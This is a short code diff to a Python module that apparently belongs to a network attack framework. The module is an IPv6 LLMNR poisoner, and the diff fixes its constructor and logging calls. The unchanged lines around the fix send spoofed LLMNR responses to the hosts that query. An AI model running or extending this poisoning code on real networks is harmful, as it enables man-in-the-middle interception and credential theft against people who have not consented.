@@ -20,8 +20,8 @@ class IPv6Module(Template):
       }
     }
 
-  def action(self, target):
-    sniffer = IPv6Sniffer()
+  def action(self, target=None):
+    sniffer = IPv6Sniffer(self)
     self.socket_log('LLMNR poisoner initialized...')
     sniffer.start()
 
@@ -29,8 +29,8 @@ class IPv6Sniffer:
     pool = None
     stopped = False
 
-    def init(self):
-        None
+    def __init__(self, mod):
+        self.mod = mod
 
     # initialize the listener
     def start(self):
@@ -121,10 +121,10 @@ class IPv6Sniffer:
                     if target == response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""):
                         send(ip_packet/udp_segment/llmnrQuery)
                         out = "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
-                        socket_log(out)
+                        self.mod.socket_log(out)
                         print out
                 else:
                     send(ip_packet/udp_segment/llmnrQuery)
                     out = "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
-                    socket_log(out)
+                    self.mod.socket_log(out)
                     print out
